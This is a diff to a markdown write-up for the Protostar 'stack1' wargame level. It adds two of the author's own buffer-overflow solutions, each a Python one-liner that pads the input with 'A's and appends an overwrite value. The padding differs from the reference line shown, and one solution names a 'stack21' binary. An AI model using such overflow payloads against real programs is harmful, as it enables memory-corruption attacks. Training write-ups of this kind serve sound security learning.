@@ -40,5 +40,14 @@ int main(int argc, char **argv)
 $ ./stack1 `python -c "print 'A'*64+'\x64\x63\x62\x61'"`
 ```
 
+##### My solution 1
+```
+./stack1 $(python -c "print 'A'*76+'\x42\x42\x42\x42'")
+```
+##### My solution 2
+```
+./stack21 $(python -c 'print "A"*76 + "BBBB"')
+```
+
 ##### Reference
 <https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>
